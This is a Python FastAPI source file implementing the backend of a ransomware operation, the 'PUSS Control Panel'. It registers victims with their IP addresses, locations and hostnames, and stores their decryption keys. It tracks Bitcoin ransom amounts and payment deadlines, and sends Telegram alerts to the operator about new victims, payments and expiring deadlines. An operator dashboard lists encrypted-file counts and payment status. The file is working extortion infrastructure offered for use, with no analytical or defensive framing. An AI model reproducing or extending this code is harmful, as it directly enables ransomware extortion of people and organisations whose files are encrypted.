
import os
import sys
import json
import time
import random
import hashlib
import hmac
import secrets
import threading
import socket
import uuid
import logging
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request, Response, HTTPException, Depends, status
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from pydantic import BaseModel, Field
import requests
import uvicorn

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
    BTC_WALLET = os.environ.get('BTC_WALLET')
    RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
    SERVER_URL = os.environ.get('SERVER_URL',)
    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
    SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
    ENVIRONMENT = os.environ.get('ENVIRONMENT', 'production')
    LOG_LEVEL = os.environ.get('LOG_LEVEL', 'WARNING')

# ============================================================================
# LOGGING SETUP
# ============================================================================

logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('system.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('puss_system')

# ============================================================================
# DATA MODELS
# ============================================================================

class VictimBase(BaseModel):
    id: str
    files_encrypted: int
    hostname: str
    ip: str
    country: str
    city: str
    lat: float
    lon: float
    os: str
    status: str
    created_at: str
    payment_deadline: str
    ransom: str
    wallet: str

class VictimCreate(BaseModel):
    victim_id: str
    files: int = 0
    hostname: Optional[str] = None
    ip: Optional[str] = None
    country: Optional[str] = None
    city: Optional[str] = None
    lat: Optional[float] = 0
    lon: Optional[float] = 0
    os: Optional[str] = None

class PaymentVerify(BaseModel):
    victim_id: str
    tx_id: str

class OwnerLogin(BaseModel):
    password: str

class SettingsUpdate(BaseModel):
    ransom_amount: Optional[str] = None
    payment_window: Optional[int] = None
    telegram_notifications: Optional[bool] = None

class NoteAdd(BaseModel):
    victim_id: str
    note: str

class TagAdd(BaseModel):
    victim_id: str
    tag: str

class DeadlineExtend(BaseModel):
    victim_id: str
    hours: int = 24

class BulkDelete(BaseModel):
    status: Optional[str] = None

# ============================================================================
# TELEGRAM INTEGRATION
# ============================================================================

class TelegramService:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.logger = logging.getLogger('telegram')
    
    def send(self, text: str) -> bool:
        if not self.enabled:
            return False
        try:
            response = requests.post(
                f"{self.base_url}/sendMessage",
                json={
                    'chat_id': self.chat_id,
                    'text': text,
                    'parse_mode': 'HTML'
                },
                timeout=5
            )
            if response.status_code == 200:
                self.logger.info(f"Message sent: {text[:50]}...")
                return True
            self.logger.error(f"Failed to send: {response.text}")
            return False
        except Exception as e:
            self.logger.error(f"Telegram error: {e}")
            return False
    
    def notify_new(self, victim: Dict) -> None:
        if not self.enabled:
            return
        msg = (f"NEW REGISTRATION\n"
               f"ID: {victim['id']}\n"
               f"Host: {victim['hostname']}\n"
               f"Location: {victim['city']}, {victim['country']}\n"
               f"IP: {victim['ip']}")
        self.send(msg)
    
    def notify_payment(self, victim: Dict) -> None:
        if not self.enabled:
            return
        msg = (f"PAYMENT RECEIVED\n"
               f"ID: {victim['id']}\n"
               f"Amount: {victim['ransom']}\n"
               f"TX: {victim['payment_tx'][:16]}...")
        self.send(msg)
    
    def notify_deadline(self, victim: Dict, hours: int) -> None:
        if not self.enabled:
            return
        msg = (f"DEADLINE APPROACHING\n"
               f"ID: {victim['id']}\n"
               f"Hours left: {hours}\n"
               f"Location: {victim['city']}, {victim['country']}")
        self.send(msg)

telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)

# ============================================================================
# DATABASE LAYER
# ============================================================================

class Database:
    def __init__(self, db_path: str = "data.json"):
        self.db_path = db_path
        self.victims: Dict[str, Dict] = {}
        self.logs: List[Dict] = []
        self.settings = {
            'ransom_amount': Config.RANSOM_AMOUNT,
            'payment_window': 72,
            'telegram_enabled': telegram.enabled,
            'version': '2.0.0'
        }
        self._load()
        self._start_monitor()
        logger.info(f"Database initialized with {len(self.victims)} victims")
    
    def _load(self) -> None:
        try:
            if os.path.exists(self.db_path):
                with open(self.db_path, 'r') as f:
                    data = json.load(f)
                    self.victims = data.get('victims', {})
                    self.logs = data.get('logs', [])
                    self.settings.update(data.get('settings', {}))
                logger.info(f"Loaded {len(self.victims)} victims from disk")
        except Exception as e:
            logger.error(f"Failed to load database: {e}")
    
    def _save(self) -> None:
        try:
            with open(self.db_path, 'w') as f:
                json.dump({
                    'victims': self.victims,
                    'logs': self.logs[-1000:],
                    'settings': self.settings
                }, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save database: {e}")
    
    def _start_monitor(self) -> None:
        def check_deadlines():
            while True:
                try:
                    now = datetime.now()
                    for vid, victim in self.victims.items():
                        if victim.get('status') == 'unpaid':
                            deadline = datetime.fromisoformat(victim['payment_deadline'])
                            hours = (deadline - now).total_seconds() / 3600
                            
                            # Check thresholds
                            if 23 < hours <= 24 and not victim.get('notified_24h'):
                                telegram.notify_deadline(victim, 24)
                                victim['notified_24h'] = True
                                self._save()
                            elif 11 < hours <= 12 and not victim.get('notified_12h'):
                                telegram.notify_deadline(victim, 12)
                                victim['notified_12h'] = True
                                self._save()
                            elif 5 < hours <= 6 and not victim.get('notified_6h'):
                                telegram.notify_deadline(victim, 6)
                                victim['notified_6h'] = True
                                self._save()
                            elif 0 < hours <= 1 and not victim.get('notified_1h'):
                                telegram.notify_deadline(victim, 1)
                                victim['notified_1h'] = True
                                self._save()
                except Exception as e:
                    logger.error(f"Monitor error: {e}")
                time.sleep(60)
        
        thread = threading.Thread(target=check_deadlines, daemon=True)
        thread.start()
    
    def add_victim(self, data: VictimCreate) -> Dict:
        from cryptography.fernet import Fernet
        key = Fernet.generate_key().decode()
        
        now = datetime.now()
        deadline = now + timedelta(hours=self.settings['payment_window'])
        
        victim = {
            'id': data.victim_id.upper(),
            'files_encrypted': data.files,
            'ransom': f"{self.settings['ransom_amount']} BTC",
            'wallet': Config.BTC_WALLET,
            'status': 'unpaid',
            'payment_deadline': deadline.isoformat(),
            'created_at': now.isoformat(),
            'decryption_key': key,
            'hostname': data.hostname or socket.gethostname(),
            'ip': data.ip or '0.0.0.0',
            'country': data.country or 'Unknown',
            'city': data.city or 'Unknown',
            'lat': data.lat or 0,
            'lon': data.lon or 0,
            'os': data.os or 'Unknown',
            'paid_at': None,
            'payment_tx': None,
            'last_seen': now.isoformat(),
            'notes': '',
            'tags': [],
            'notified_24h': False,
            'notified_12h': False,
            'notified_6h': False,
            'notified_1h': False
        }
        
        self.victims[victim['id']] = victim
        self._save()
        
        self.log('info', f"New victim: {victim['id']}", victim['id'])
        telegram.notify_new(victim)
        logger.info(f"Victim added: {victim['id']}")
        
        return victim
    
    def get_victim(self, victim_id: str) -> Optional[Dict]:
        return self.victims.get(victim_id.upper())
    
    def verify_payment(self, victim_id: str, tx_id: str) -> bool:
        vid = victim_id.upper()
        if vid in self.victims:
            self.victims[vid]['status'] = 'paid'
            self.victims[vid]['payment_tx'] = tx_id
            self.victims[vid]['paid_at'] = datetime.now().isoformat()
            self._save()
            
            self.log('success', f"Payment verified: {vid}", vid)
            telegram.notify_payment(self.victims[vid])
            logger.info(f"Payment verified: {vid}")
            return True
        return False
    
    def update_victim(self, victim_id: str, data: Dict) -> bool:
        vid = victim_id.upper()
        if vid in self.victims:
            self.victims[vid].update(data)
            self.victims[vid]['last_seen'] = datetime.now().isoformat()
            self._save()
            return True
        return False
    
    def delete_victim(self, victim_id: str) -> bool:
        vid = victim_id.upper()
        if vid in self.victims:
            del self.victims[vid]
            self._save()
            self.log('warning', f"Deleted: {vid}")
            logger.warning(f"Victim deleted: {vid}")
            return True
        return False
    
    def bulk_delete(self, status: Optional[str] = None) -> int:
        to_delete = []
        for vid, v in self.victims.items():
            if status is None or v.get('status') == status:
                to_delete.append(vid)
        
        for vid in to_delete:
            del self.victims[vid]
        
        self._save()
        self.log('info', f"Bulk deleted {len(to_delete)} victims")
        logger.info(f"Bulk deleted {len(to_delete)} victims")
        return len(to_delete)
    
    def extend_deadline(self, victim_id: str, hours: int) -> bool:
        vid = victim_id.upper()
        if vid in self.victims and self.victims[vid]['status'] == 'unpaid':
            current = datetime.fromisoformat(self.victims[vid]['payment_deadline'])
            new = current + timedelta(hours=hours)
            self.victims[vid]['payment_deadline'] = new.isoformat()
            self._save()
            self.log('info', f"Deadline extended for {vid} by {hours}h", vid)
            logger.info(f"Deadline extended: {vid} +{hours}h")
            return True
        return False
    
    def add_note(self, victim_id: str, note: str) -> bool:
        vid = victim_id.upper()
        if vid in self.victims:
            self.victims[vid]['notes'] = note
            self._save()
            return True
        return False
    
    def add_tag(self, victim_id: str, tag: str) -> bool:
        vid = victim_id.upper()
        if vid in self.victims:
            if 'tags' not in self.victims[vid]:
                self.victims[vid]['tags'] = []
            if tag not in self.victims[vid]['tags']:
                self.victims[vid]['tags'].append(tag)
                self._save()
            return True
        return False
    
    def get_all(self) -> Dict:
        return self.victims
    
    def get_stats(self) -> Dict:
        total = len(self.victims)
        paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
        unpaid = total - paid
        expired = sum(1 for v in self.victims.values() 
                     if v.get('status') == 'unpaid' 
                     and datetime.fromisoformat(v['payment_deadline']) < datetime.now())
        
        try:
            amount = float(self.settings['ransom_amount'])
            total_btc = paid * amount
        except:
            total_btc = paid * 0.5
        
        countries = {}
        for v in self.victims.values():
            c = v.get('country', 'Unknown')
            countries[c] = countries.get(c, 0) + 1
        
        return {
            'total': total,
            'paid': paid,
            'unpaid': unpaid,
            'expired': expired,
            'total_btc': f"{total_btc:.2f}",
            'countries': countries,
            'success_rate': round((paid/total*100) if total > 0 else 0, 1),
            'timestamp': datetime.now().isoformat()
        }
    
    def log(self, level: str, message: str, victim_id: Optional[str] = None) -> None:
        self.logs.append({
            'timestamp': datetime.now().isoformat(),
            'level': level,
            'message': message,
            'victim_id': victim_id
        })
        self._save()
    
    def get_logs(self, limit: int = 100) -> List:
        return self.logs[-limit:]
    
    def update_settings(self, updates: Dict) -> Dict:
        self.settings.update(updates)
        self._save()
        self.log('info', "Settings updated")
        return self.settings

db = Database()

# ============================================================================
# AUTHENTICATION
# ============================================================================

security = HTTPBasic()

def verify_owner(credentials: HTTPBasicCredentials = Depends(security)):
    correct_password = hmac.compare_digest(
        credentials.password.encode('utf-8'),
        Config.OWNER_PASSWORD.encode('utf-8')
    )
    if not correct_password:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid credentials"
        )
    return credentials.username

# ============================================================================
# FASTAPI APPLICATION
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("Starting PUSS Control Panel")
    logger.info(f"Environment: {Config.ENVIRONMENT}")
    logger.info(f"Telegram: {'Enabled' if telegram.enabled else 'Disabled'}")
    yield
    logger.info("Shutting down")

app = FastAPI(
    title="PUSS Control Panel",
    version="2.0.0",
    lifespan=lifespan,
    docs_url=None,
    redoc_url=None
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================================
# HTML TEMPLATES (MINIMAL, PROFESSIONAL)
# ============================================================================

INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>System Access</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace;
            color: #00ff00;
            line-height: 1.6;
        }
        .terminal {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #000000;
            border: 1px solid #1a1a1a;
        }
        .header {
            border-bottom: 1px solid #1a1a1a;
            padding: 10px 0;
            margin-bottom: 20px;
            color: #666;
        }
        .prompt {
            color: #00ff00;
            margin-right: 10px;
        }
        input {
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: monospace;
            font-size: 16px;
            width: 300px;
            outline: none;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .stat {
            border: 1px solid #1a1a1a;
            padding: 10px;
            text-align: center;
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #00ff00;
        }
        .stat-label {
            font-size: 12px;
            color: #666;
        }
        .button {
            background: #1a1a1a;
            border: none;
            color: #00ff00;
            padding: 10px 20px;
            font-family: monospace;
            cursor: pointer;
        }
        .button:hover {
            background: #2a2a2a;
        }
        .error {
            color: #ff0000;
            margin: 10px 0;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #1a1a1a;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="header">PUSS SYSTEM v2.0.0 | SECURE TERMINAL</div>
        
        <div class="stats" id="stats">
            <div class="stat"><div class="stat-value">-</div><div class="stat-label">TOTAL</div></div>
            <div class="stat"><div class="stat-value">-</div><div class="stat-label">PAID</div></div>
            <div class="stat"><div class="stat-value">-</div><div class="stat-label">UNPAID</div></div>
            <div class="stat"><div class="stat-value">-</div><div class="stat-label">BTC</div></div>
        </div>
        
        <div style="margin: 20px 0;">
            <span class="prompt">></span>
            <input type="password" id="password" placeholder="enter password" onkeypress="handleKey(event)">
        </div>
        
        <div>
            <button class="button" onclick="login()">[ AUTHENTICATE ]</button>
        </div>
        
        <div class="status" id="status">
            SYSTEM READY | TELEGRAM: {% if telegram.enabled %}CONNECTED{% else %}DISABLED{% endif %}
        </div>
    </div>

    <script>
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const stats = await res.json();
                document.getElementById('stats').innerHTML = `
                    <div class="stat"><div class="stat-value">${stats.total}</div><div class="stat-label">TOTAL</div></div>
                    <div class="stat"><div class="stat-value">${stats.paid}</div><div class="stat-label">PAID</div></div>
                    <div class="stat"><div class="stat-value">${stats.unpaid}</div><div class="stat-label">UNPAID</div></div>
                    <div class="stat"><div class="stat-value">${stats.total_btc}</div><div class="stat-label">BTC</div></div>
                `;
            } catch(e) {}
        }

        function handleKey(e) {
            if (e.key === 'Enter') login();
        }

        async function login() {
            const pwd = document.getElementById('password').value;
            const res = await fetch('/api/owner/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: pwd})
            });
            const data = await res.json();
            if (data.success) {
                window.location.href = '/dashboard';
            } else {
                document.getElementById('status').innerHTML = 'ACCESS DENIED';
                document.getElementById('password').value = '';
            }
        }

        loadStats();
        setInterval(loadStats, 10000);
    </script>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace;
            color: #00ff00;
            line-height: 1.6;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            border-bottom: 1px solid #1a1a1a;
            padding: 10px 0;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 10px;
            margin-bottom: 20px;
        }
        .stat {
            border: 1px solid #1a1a1a;
            padding: 15px;
        }
        .stat-value { font-size: 28px; font-weight: bold; }
        .stat-label { font-size: 12px; color: #666; }
        .table {
            border: 1px solid #1a1a1a;
            overflow-x: auto;
        }
        .row {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr;
            padding: 10px;
            border-bottom: 1px solid #1a1a1a;
            min-width: 1000px;
        }
        .row.header {
            background: #1a1a1a;
            color: #666;
            font-weight: bold;
        }
        .badge {
            padding: 2px 6px;
            font-size: 11px;
        }
        .badge.paid { background: #003300; color: #00ff00; }
        .badge.unpaid { background: #330000; color: #ff0000; }
        .button {
            background: #1a1a1a;
            border: none;
            color: #00ff00;
            padding: 5px 10px;
            font-family: monospace;
            cursor: pointer;
            font-size: 12px;
        }
        .button.small { padding: 2px 5px; }
        .panel {
            border: 1px solid #1a1a1a;
            padding: 15px;
            margin-bottom: 20px;
        }
        input, select {
            background: #1a1a1a;
            border: none;
            color: #00ff00;
            padding: 8px;
            font-family: monospace;
            margin-right: 10px;
        }
        .logs {
            height: 200px;
            overflow-y: auto;
            background: #000;
            padding: 10px;
            font-size: 12px;
        }
        .log-entry {
            border-bottom: 1px solid #1a1a1a;
            padding: 5px 0;
        }
        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>PUSS CONTROL PANEL v2.0.0</div>
            <div>
                <span id="timestamp"></span>
                <button class="button" onclick="logout()">[ LOGOUT ]</button>
            </div>
        </div>

        <div class="stats" id="stats"></div>

        <div class="panel">
            <h3 style="margin-bottom: 15px;">CONTROLS</h3>
            <div class="flex">
                <input type="text" id="victim_id" placeholder="victim id">
                <input type="number" id="hours" value="24" style="width: 80px;">
                <button class="button" onclick="extendDeadline()">EXTEND DEADLINE</button>
            </div>
            <div class="flex" style="margin-top: 10px;">
                <select id="bulk_status">
                    <option value="">ALL</option>
                    <option value="paid">PAID</option>
                    <option value="unpaid">UNPAID</option>
                </select>
                <button class="button" onclick="bulkDelete()">BULK DELETE</button>
                <button class="button" onclick="refreshData()">REFRESH</button>
            </div>
        </div>

        <div class="table">
            <div class="row header">
                <div>ID</div>
                <div>FILES</div>
                <div>HOST</div>
                <div>LOCATION</div>
                <div>DEADLINE</div>
                <div>STATUS</div>
                <div>RANSOM</div>
                <div>ACTION</div>
            </div>
            <div id="victims"></div>
        </div>

        <div class="panel" style="margin-top: 20px;">
            <h3 style="margin-bottom: 15px;">SYSTEM LOGS</h3>
            <div class="logs" id="logs"></div>
        </div>
    </div>

    <script>
        async function loadData() {
            const [statsRes, victimsRes, logsRes] = await Promise.all([
                fetch('/api/stats'),
                fetch('/api/victims'),
                fetch('/api/logs?limit=50')
            ]);
            
            const stats = await statsRes.json();
            const victims = await victimsRes.json();
            const logs = await logsRes.json();
            
            document.getElementById('timestamp').innerText = new Date().toLocaleString();
            
            document.getElementById('stats').innerHTML = `
                <div class="stat"><div class="stat-value">${stats.total}</div><div class="stat-label">TOTAL</div></div>
                <div class="stat"><div class="stat-value">${stats.paid}</div><div class="stat-label">PAID</div></div>
                <div class="stat"><div class="stat-value">${stats.unpaid}</div><div class="stat-label">UNPAID</div></div>
                <div class="stat"><div class="stat-value">${stats.expired}</div><div class="stat-label">EXPIRED</div></div>
                <div class="stat"><div class="stat-value">${stats.total_btc}</div><div class="stat-label">BTC</div></div>
            `;
            
            let victimsHtml = '';
            for (const [id, v] of Object.entries(victims)) {
                const deadline = new Date(v.payment_deadline).toLocaleString();
                victimsHtml += `
                    <div class="row">
                        <div>${id}</div>
                        <div>${v.files_encrypted}</div>
                        <div>${v.hostname}</div>
                        <div>${v.city}, ${v.country}</div>
                        <div>${deadline}</div>
                        <div><span class="badge ${v.status}">${v.status}</span></div>
                        <div>${v.ransom}</div>
                        <div><button class="button small" onclick="deleteVictim('${id}')">DELETE</button></div>
                    </div>
                `;
            }
            document.getElementById('victims').innerHTML = victimsHtml || '<div class="row">No victims</div>';
            
            let logsHtml = '';
            logs.forEach(log => {
                logsHtml += `<div class="log-entry">[${log.timestamp}] ${log.level}: ${log.message}</div>`;
            });
            document.getElementById('logs').innerHTML = logsHtml;
        }

        async function deleteVictim(id) {
            if (confirm(`Delete ${id}?`)) {
                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
                loadData();
            }
        }

        async function extendDeadline() {
            const id = document.getElementById('victim_id').value;
            const hours = document.getElementById('hours').value;
            if (!id) return;
            
            await fetch('/api/victim/extend', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({victim_id: id, hours: parseInt(hours)})
            });
            loadData();
        }

        async function bulkDelete() {
            const status = document.getElementById('bulk_status').value;
            if (!confirm('Confirm bulk delete?')) return;
            
            await fetch('/api/victims/bulk', {
                method: 'DELETE',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({status: status || null})
            });
            loadData();
        }

        function refreshData() {
            loadData();
        }

        async function logout() {
            await fetch('/api/owner/logout');
            window.location.href = '/';
        }

        loadData();
        setInterval(loadData, 30000);
    </script>
</body>
</html>
"""

# ============================================================================
# API ROUTES
# ============================================================================

@app.get('/', response_class=HTMLResponse)
async def index():
    return INDEX_HTML.replace('{% if telegram.enabled %}CONNECTED{% else %}DISABLED{% endif %}', 
                              'CONNECTED' if telegram.enabled else 'DISABLED')

@app.get('/dashboard', response_class=HTMLResponse)
async def dashboard():
    return DASHBOARD_HTML

@app.post('/api/owner/login')
async def owner_login(login: OwnerLogin):
    success = hmac.compare_digest(login.password.encode(), Config.OWNER_PASSWORD.encode())
    return {'success': success}

@app.get('/api/owner/logout')
async def owner_logout():
    return {'success': True}

@app.get('/api/stats')
async def get_stats():
    return db.get_stats()

@app.get('/api/victims')
async def get_victims():
    return db.get_all()

@app.get('/api/victim/{victim_id}')
async def get_victim(victim_id: str):
    victim = db.get_victim(victim_id)
    if not victim:
        raise HTTPException(status_code=404, detail="Victim not found")
    return victim

@app.post('/api/victim')
async def add_victim(victim: VictimCreate):
    return db.add_victim(victim)

@app.post('/api/victim/verify')
async def verify_payment(payment: PaymentVerify):
    success = db.verify_payment(payment.victim_id, payment.tx_id)
    return {'success': success}

@app.post('/api/victim/extend')
async def extend_deadline(extend: DeadlineExtend):
    success = db.extend_deadline(extend.victim_id, extend.hours)
    return {'success': success}

@app.delete('/api/victim/{victim_id}')
async def delete_victim(victim_id: str):
    success = db.delete_victim(victim_id)
    return {'success': success}

@app.delete('/api/victims/bulk')
async def bulk_delete(bulk: BulkDelete):
    count = db.bulk_delete(bulk.status)
    return {'count': count}

@app.get('/api/logs')
async def get_logs(limit: int = 100):
    return db.get_logs(limit)

@app.post('/api/telegram/test')
async def test_telegram():
    if not telegram.enabled:
        return {'success': False, 'error': 'Telegram not configured'}
    success = telegram.send("Test message from PUSS system")
    return {'success': success}

@app.get('/api/health')
async def health():
    return {
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '2.0.0',
        'telegram': telegram.enabled,
        'victims': len(db.victims)
    }

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8000))
    host = os.environ.get('HOST', '0.0.0.0')
    
    logger.info("=" * 50)
    logger.info("PUSS CONTROL PANEL")
    logger.info("=" * 50)
    logger.info(f"Port: {port}")
    logger.info(f"Host: {host}")
    logger.info(f"Telegram: {'Enabled' if telegram.enabled else 'Disabled'}")
    logger.info("=" * 50)
    
    uvicorn.run(
        "main:app",
        host=host,
        port=port,
        log_level=Config.LOG_LEVEL.lower(),
        reload=Config.ENVIRONMENT == 'development'
    )
